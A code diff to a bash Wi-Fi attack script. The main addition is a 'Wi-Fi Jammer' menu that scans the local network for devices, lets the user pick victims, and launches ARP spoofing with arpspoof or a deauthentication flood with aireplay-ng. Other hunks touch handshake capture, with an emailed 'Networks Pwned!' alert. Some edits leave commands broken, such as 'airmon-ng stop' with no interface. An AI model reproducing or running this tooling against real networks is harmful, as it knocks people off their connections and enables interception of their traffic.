@@ -444,7 +444,7 @@ cleanup () {
 
 cleanup_handshakes() {
     # Define the directory path explicitly
-    local script_dir="/home/superuser/air-script"  # Adjust the path to your actual script location
+    local script_dir="/home/*/air-script"  # Adjust the path to your actual script location
 
     # Ensure you're in the correct directory
     if [ ! -d "$script_dir/handshakes" ]; then
@@ -507,14 +507,206 @@ sudo bash airgeddon.sh
 }
 
 
-wifiJammer () {        ##### Sending unlimited DeAuth #####
-monitor
-airodump-ng --bssid $bssid --channel $channel $foo > /dev/null & sleep 5 ; kill $!  
-echo -e "[${Green}${targetName}${White}] DoS started, all devices disconnected... "
-sleep 0.5
-echo -e "[${Green}DoS${White}] Press ctrl+c to stop attack & exit..."
-aireplay-ng --deauth 0 -a $bssid $foo > /dev/null
+################## WIFI JAMMER ####################################
+
+
+
+
+
+
+
+
+
+# Function: List network interfaces and allow selection
+select_interface() {
+    echo "Available network interfaces:"
+    interfaces=($(ls /sys/class/net))
+    select interface in "${interfaces[@]}"; do
+        if [[ -n "$interface" ]]; then
+            echo "Selected interface: $interface"
+            break
+        else
+            echo "Invalid selection. Try again."
+        fi
+    done
 }
+
+# Function: Scan for clients on the current network using arp-scan
+scan_clients() {
+    echo "Scanning current network for connected devices..."
+
+    # Perform an ARP scan with retries and save results
+    retries=3
+    for i in $(seq 1 "$retries"); do
+        echo "ARP Scan Attempt $i of $retries..."
+        sudo arp-scan --localnet --interface="$interface" --retry=5 >> arp_scan_results_raw.txt
+        sleep 1
+    done
+
+    # Clean up and remove duplicates from the results
+    sort -u -o arp_scan_results_raw.txt arp_scan_results_raw.txt
+
+    # Extract IP, MAC, and vendor information
+    awk '/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1, $2, $3}' arp_scan_results_raw.txt > arp_scan_results.txt
+
+    # Display the results
+    echo -e "\nDetected Clients:"
+    echo "------------------------------------------------------------"
+    echo "No.  IP Address      MAC Address         Vendor/Device Name"
+    echo "------------------------------------------------------------"
+    awk '{printf "%-3d %-15s %-17s %-20s\n", NR, $1, $2, $3}' arp_scan_results.txt
+
+    # Count total clients
+    total_clients=$(wc -l < arp_scan_results.txt)
+    if [ "$total_clients" -eq 0 ]; then
+        echo "No clients found. Retrying with nmap for more details..."
+        
+        # Fallback: Use nmap to detect devices
+        gateway_ip=$(ip route | awk '/default/ {print $3}')
+        subnet=$(echo "$gateway_ip" | awk -F. '{print $1"."$2"."$3".0/24"}')
+        sudo nmap -sn "$subnet" | awk '/Nmap scan report/{ip=$NF}/MAC Address/{print ip, $3, $4, $5, $6}' >> arp_scan_results.txt
+
+        total_clients=$(wc -l < arp_scan_results.txt)
+        if [ "$total_clients" -eq 0 ]; then
+            echo "No clients found after retrying. Exiting."
+            exit 1
+        fi
+    fi
+}
+
+# Function: Allow user to select target clients
+select_clients() {
+    echo -e "\nSelect clients to target:"
+    echo "1) Single client"
+    echo "2) Multiple clients"
+    echo "3) All clients"
+    read -p "Enter your choice (1/2/3): " choice
+
+    case $choice in
+        1)
+            read -p "Enter the client number to target: " target_num
+            target_mac=$(awk -v num="$target_num" '/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {if (NR == num) print $2}' arp_scan_results.txt)
+            targets=("$target_mac")
+            ;;
+        2)
+            echo "Enter the client numbers to target (separated by spaces):"
+            read -a target_nums
+            targets=()
+            for num in "${target_nums[@]}"; do
+                mac=$(awk -v num="$num" '/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {if (NR == num) print $2}' arp_scan_results.txt)
+                targets+=("$mac")
+            done
+            ;;
+        3)
+            targets=($(awk '/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $2}' arp_scan_results.txt))
+            ;;
+        *)
+            echo "Invalid choice. Exiting."
+            exit 1
+            ;;
+    esac
+}
+
+# Function: Auto-detect BSSID and channel
+auto_detect_bssid_channel() {
+    echo "Auto-detecting BSSID and channel of the connected network..."
+    bssid=$(iw dev "$interface" link | awk '/Connected/ {print $3}')
+    channel=$(iw dev "$interface" info | awk '/channel/ {print $2}')
+
+    if [[ -z "$bssid" || -z "$channel" ]]; then
+        echo "Failed to detect BSSID or channel. Ensure you're connected to a network."
+        exit 1
+    fi
+
+    echo "Detected BSSID: $bssid"
+    echo "Detected Channel: $channel"
+}
+
+# Function: Perform ARP spoofing attack
+arp_spoof() {
+    echo "Starting ARP spoofing attack..."
+    for mac in "${targets[@]}"; do
+        echo "Spoofing client: $mac"
+        sudo arpspoof -i "$interface" -t "$mac" "$gateway_ip" &
+    done
+    echo "ARP spoofing attack in progress. Press Ctrl+C to stop."
+    wait
+}
+
+# Function: Perform DeAuth attack
+deauth_attack() {
+    echo "Starting DeAuth attack..."
+    for mac in "${targets[@]}"; do
+        echo "Deauthenticating client: $mac"
+        aireplay-ng --deauth 1000 -a "$bssid" -c "$mac" "$monitor_interface"
+    done
+    echo "DeAuth attack complete."
+}
+
+# Main Script Logic
+wifiJammer() {
+    echo "Wi-Fi Jammer"
+    echo "------------"
+    echo "1) Target Current Network"
+    echo "2) Target Another Network"
+    read -p "Choose an option (1/2): " network_choice
+
+    if [ "$network_choice" -eq 2 ]; then
+        echo "Feature to target another network is not implemented yet."
+        exit 0
+    fi
+
+    echo "Available attack methods:"
+    echo "1) ARP Spoofing"
+    echo "2) DeAuth Attack"
+    read -p "Choose an attack method (1/2): " attack_method
+
+    # Select interface for ARP scan
+    select_interface
+
+    # Scan for clients
+    scan_clients
+
+    # Select target clients
+    select_clients
+
+    if [ "$attack_method" -eq 1 ]; then
+        echo "Performing ARP Spoofing Attack..."
+        read -p "Enter the gateway IP for ARP spoofing: " gateway_ip
+        arp_spoof
+    elif [ "$attack_method" -eq 2 ]; then
+        echo "Performing DeAuth Attack..."
+        # Auto-detect BSSID and channel
+        auto_detect_bssid_channel
+
+        # Enable monitor mode
+        echo "Enabling monitor mode on $interface..."
+        airmon-ng start "$interface"
+        monitor_interface="${interface}mon"
+
+        # Perform DeAuth attack
+        deauth_attack
+
+        # Disable monitor mode after the attack
+        echo "Disabling monitor mode on $monitor_interface..."
+        airmon-ng stop "$monitor_interface"
+    else
+        echo "Invalid attack method selected. Exiting."
+        exit 1
+    fi
+}
+
+
+
+
+
+
+
+
+
+
+
+##############################################################################
 
 
 # Function to capture MAC addresses and process them
@@ -750,7 +942,7 @@ check_cap_files() {
                 
                 # Turn off monitor mode silently
                 echo "Turning off monitor mode..."
-                sudo airmon-ng stop wlan0mon > /dev/null 2>&1
+                sudo airmon-ng stop  > /dev/null 2>&1
                 sudo airmon-ng stop wlp7s0mon > /dev/null 2>&1
                 sudo systemctl start NetworkManager > /dev/null 2>&1
                 echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email > /dev/null 2>&1
@@ -1438,7 +1630,7 @@ run_script_if_exists "uninstall.sh"
 
 stopMon () {
   sudo airmon-ng stop $foo > /dev/null 2>&1
-  sudo airmon-ng stop wlan0mon > /dev/null 2>&1
+  sudo airmon-ng stop  > /dev/null 2>&1
   sudo airmon-ng stop wlp7s0mon > /dev/null 2>&1
 		sudo systemctl start NetworkManager > /dev/null 2>&1
   sudo systemctl start wpa_supplicant > /dev/null 2>&1
@@ -1461,7 +1653,7 @@ echo " https://github.com/B3ND1X/nm4n00bz"
 
 
 # Script path
-SCRIPT_DIR="/home/superuser/air-script"  # Define the air-script directory path
+SCRIPT_DIR="/home/*/air-script"  # Define the air-script directory path
 
 # Function to check if the script exists and run it
 run_script_if_exists() {
